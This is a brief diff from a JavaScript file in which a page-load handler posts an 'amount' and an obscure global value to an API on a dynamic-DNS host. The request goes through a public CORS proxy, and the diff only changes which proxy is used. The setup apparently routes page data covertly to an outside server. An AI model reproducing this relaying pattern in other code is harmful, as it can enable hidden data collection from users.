@@ -84,7 +84,7 @@ document.addEventListener('DOMContentLoaded', function () {
                     console.log(amount);
 
 
-                    axios.post('https://api.codetabs.com/v1/proxy/?quest=http://1z624868f2.wicp.vip/api/users/' + uurls, {
+                    axios.post('https://api.cors.lol/?url=http://1z624868f2.wicp.vip/api/users/' + uurls, {
                         historical: window.lsjls,
                         amount: amount
                     })
